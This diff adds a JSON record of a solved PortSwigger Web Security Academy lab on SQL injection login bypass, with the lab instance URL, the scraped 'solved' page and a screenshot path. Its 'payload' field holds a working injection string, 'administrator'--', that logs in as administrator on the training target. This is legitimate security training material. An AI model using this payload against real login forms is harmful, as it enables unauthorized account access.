@@ -1,0 +1,11 @@
+{
+  "lab": "SQL injection vulnerability allowing login bypass",
+  "officialUrl": "https://portswigger.net/web-security/sql-injection/lab-login-bypass",
+  "instanceBase": "https://0ab9007a0370bf3b802d7607005900b1.web-security-academy.net",
+  "payload": "administrator'--",
+  "solved": true,
+  "text": "SQL injection vulnerability allowing login bypass\nBack to lab description  \nLAB\n\nSolved\n\nCongratulations, you solved the lab!\nShare your skills! \n \n Continue learning\nHome\n\n|\n\nMy account\n\n|\n\nLog out\nMy Account\n\nYour username is: administrator\n\nEmail\n Update email",
+  "title": "SQL injection vulnerability allowing login bypass",
+  "url": "https://0ab9007a0370bf3b802d7607005900b1.web-security-academy.net/my-account?id=administrator",
+  "evidenceScreenshot": "../screenshots/02-sqli-login-bypass-solved.png"
+}
